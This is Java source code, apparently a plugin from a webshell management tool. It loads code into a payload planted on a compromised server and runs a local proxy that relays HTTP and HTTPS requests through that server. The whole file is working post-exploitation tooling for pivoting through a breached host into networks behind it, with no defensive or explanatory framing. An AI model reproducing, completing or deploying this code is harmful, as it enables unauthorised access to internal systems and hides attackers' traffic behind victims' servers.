package shells.plugins.generic;

import com.httpProxy.server.CertPool;
import com.httpProxy.server.core.HttpProxyHandle;
import com.httpProxy.server.core.HttpProxyServer;
import com.httpProxy.server.request.HttpRequest;
import com.httpProxy.server.response.HttpResponse;
import com.httpProxy.server.response.HttpResponseStatus;
import core.ApplicationContext;
import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.Socket;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;





public abstract class HttpProxy
  implements Plugin, HttpProxyHandle
{
  private final JPanel panel;
  private final RTextArea tipTextArea;
  private final JButton stopButton;
  private final JButton startButton;
  private final JLabel hostLabel;
  private final JLabel portLabel;
  private final JTextField hostTextField;
  private final JTextField portTextField;
  private final JSplitPane httpProxySplitPane;
  private boolean loadState;
  private ShellEntity shellEntity;
  private Payload payload;
  private Encoding encoding;
  private HttpProxyServer httpProxyServer;
  
  public HttpProxy() {
    this.panel = new JPanel(new BorderLayout());
    
    this.hostLabel = new JLabel("host :");
    this.portLabel = new JLabel("port :");
    this.startButton = new JButton("Start");
    this.stopButton = new JButton("Stop");
    this.hostTextField = new JTextField("127.0.0.1", 15);
    this.portTextField = new JTextField("8888", 7);
    this.tipTextArea = new RTextArea();
    this.httpProxySplitPane = new JSplitPane();
    
    this.httpProxySplitPane.setOrientation(0);
    this.httpProxySplitPane.setDividerSize(0);

    
    this.tipTextArea.append("Logs:\r\n");
    
    JPanel httpProxyTopPanel = new JPanel();
    httpProxyTopPanel.add(this.hostLabel);
    httpProxyTopPanel.add(this.hostTextField);
    httpProxyTopPanel.add(this.portLabel);
    httpProxyTopPanel.add(this.portTextField);
    httpProxyTopPanel.add(this.startButton);
    httpProxyTopPanel.add(this.stopButton);
    
    this.httpProxySplitPane.setTopComponent(httpProxyTopPanel);
    this.httpProxySplitPane.setBottomComponent(new JScrollPane((Component)this.tipTextArea));

    
    this.panel.add(this.httpProxySplitPane);
  }

  
  public boolean load() {
    if (!this.loadState) {
      try {
        byte[] data = readPlugin();
        if (this.payload.include(getClassName(), data)) {
          this.loadState = true;
          Log.log("Load success", new Object[0]);
          this.tipTextArea.append("Load success\r\n");
          return true;
        } 
        Log.error("Load fail");
        this.tipTextArea.append("Load fail\r\n");
        return false;
      }
      catch (Exception e) {
        Log.error(e);
        return false;
      } 
    }
    
    return true;
  }
  
  public abstract byte[] readPlugin() throws IOException;
  
  public abstract String getClassName();
  
  public void handler(Socket clientSocket, HttpRequest httpRequest) throws Exception {
    HttpResponse response = sendHttpRequest(httpRequest);
    String logMessage = String.format("Time:%s Url:%s httpMehtod:%s HttpVersion:%s requestBodySize:%s responseCode:%s responseBodySize:%s\r\n", new Object[] { functions.getCurrentTime(), httpRequest.getUrl(), httpRequest.getMethod(), httpRequest.getHttpVersion(), (httpRequest.getRequestData() == null) ? "0" : Integer.valueOf((httpRequest.getRequestData()).length), Integer.valueOf(response.getHttpResponseStatus().code()), (response.getResponseData() == null) ? "0" : Integer.valueOf((response.getResponseData()).length) });
    Log.log(logMessage, new Object[0]);
    this.tipTextArea.append(logMessage);
    clientSocket.getOutputStream().write(response.encode());
  }
  
  public HttpResponse sendHttpRequest(HttpRequest httpRequest) {
    httpRequest.getHttpRequestHeader().setHeader("Connection", "close");
    
    ReqParameter reqParameter = new ReqParameter();
    reqParameter.add("httpUri", httpRequest.getUri());
    reqParameter.add("httpUrl", httpRequest.getUrl());
    reqParameter.add("httpMehtod", httpRequest.getMethod());
    reqParameter.add("httpHeaders", httpRequest.getHttpRequestHeader().decode());
    reqParameter.add("HttpVersion", httpRequest.getHttpVersion());
    reqParameter.add("httpHost", httpRequest.getHost());
    reqParameter.add("httpPort", String.valueOf(httpRequest.getPort()));
    if (httpRequest.getRequestData() != null) {
      reqParameter.add("httpRequestData", httpRequest.getRequestData());
    }
    byte[] response = this.payload.evalFunc(getClassName(), "httpRequestProxy", reqParameter);
    HttpResponse httpResponse = null;
    try {
      httpResponse = HttpResponse.decode(response);
      if (httpResponse.getHttpResponseStatus().getCode() == HttpResponseStatus.CONTINUE.code()) {
        httpResponse = HttpResponse.decode(httpResponse.getResponseData());
      }
      httpResponse.getHttpResponseHeader().setHeader("Connection", "close");
      
      httpResponse.getHttpResponseHeader().removeHeader("Transfer-Encoding");
    } catch (Exception e) {
      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
      PrintStream printStream = new PrintStream(byteArrayOutputStream);
      e.printStackTrace(printStream);
      printStream.flush();
      printStream.close();
      
      try {
        byteArrayOutputStream.write("\r\n".getBytes());
        byteArrayOutputStream.write("response ->\r\n".getBytes());
        byteArrayOutputStream.write((response == null) ? "null".getBytes() : response);
      } catch (Exception exception) {}


      
      httpResponse = new HttpResponse(HttpResponseStatus.INTERNAL_SERVER_ERROR, null, byteArrayOutputStream.toByteArray());
      try {
        byteArrayOutputStream.close();
      } catch (IOException ioException) {
        ioException.printStackTrace();
      } 
    } 
    return httpResponse;
  }
  
  private void startButtonClick(ActionEvent actionEvent) throws Exception {
    load();
    if (this.httpProxyServer == null) {
      
      int listenPort = Integer.valueOf(this.portTextField.getText().trim()).intValue();
      InetAddress bindAddr = InetAddress.getByName(this.hostTextField.getText().trim());
      
      CertPool certPool = new CertPool(ApplicationContext.getHttpsPrivateKey(), ApplicationContext.getHttpsCert());
      
      this.httpProxyServer = new HttpProxyServer(listenPort, 50, bindAddr, certPool, this);
      
      if (this.httpProxyServer.startup()) {
        this.tipTextArea.append(String.format("start! bindAddr: %s listenPort: %s\r\n", new Object[] { bindAddr.getHostAddress(), Integer.valueOf(listenPort) }));
        GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "start!", "提示", 1);
      } else {
        this.httpProxyServer = null;
        GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "fail!", "提示", 1);
      } 
    } else {
      
      GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "started!", "提示", 2);
    } 
  }
  private void stopButtonClick(ActionEvent actionEvent) {
    if (this.httpProxyServer == null) {
      GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "no start!", "提示", 2);
    } else {
      this.httpProxyServer.setNextSocket(false);
      this.httpProxyServer.shutdown();
      this.httpProxyServer = null;
      this.tipTextArea.append("stop!\r\n");
      GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "stop!", "提示", 1);
    } 
  }
  
  public void closePlugin() {
    try {
      if (this.httpProxyServer != null) {
        this.httpProxyServer.setNextSocket(false);
        this.httpProxyServer.shutdown();
        this.httpProxyServer = null;
      } 
    } catch (Exception e) {
      Log.error(e);
    } 
  }


  
  public void init(ShellEntity shellEntity) {
    this.shellEntity = shellEntity;
    this.payload = this.shellEntity.getPayloadModule();
    this.encoding = Encoding.getEncoding(this.shellEntity);
    automaticBindClick.bindJButtonClick(HttpProxy.class, this, HttpProxy.class, this);
  }


  
  public JPanel getView() {
    return this.panel;
  }
}
